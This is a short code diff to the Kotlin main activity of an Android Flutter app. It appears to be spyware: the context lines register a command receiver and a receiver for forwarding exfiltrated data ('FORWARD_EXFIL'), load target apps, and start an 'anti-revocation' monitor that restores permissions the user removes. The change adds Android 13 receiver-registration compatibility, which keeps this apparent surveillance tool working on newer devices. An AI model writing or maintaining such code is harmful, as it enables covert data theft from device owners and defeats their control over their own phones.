@@ -81,10 +81,19 @@ class MainActivity : FlutterActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        registerReceiver(commandReceiver, IntentFilter("com.decry.COMMAND"))
-        registerReceiver(dataCaptureReceiver, IntentFilter("com.decry.FORWARD_EXFIL"))
+        registerDecryReceiver(commandReceiver, IntentFilter("com.decry.COMMAND"))
+        registerDecryReceiver(dataCaptureReceiver, IntentFilter("com.decry.FORWARD_EXFIL"))
         loadTargetApps()
         startAntiRevocationMonitor()
+    }
+
+    // Android 13+ requires an explicit export flag for runtime receivers.
+    private fun registerDecryReceiver(receiver: BroadcastReceiver, filter: IntentFilter) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
+        } else {
+            registerReceiver(receiver, filter)
+        }
     }
 
     // Anti-revocation: Monitor and restore permissions continuously
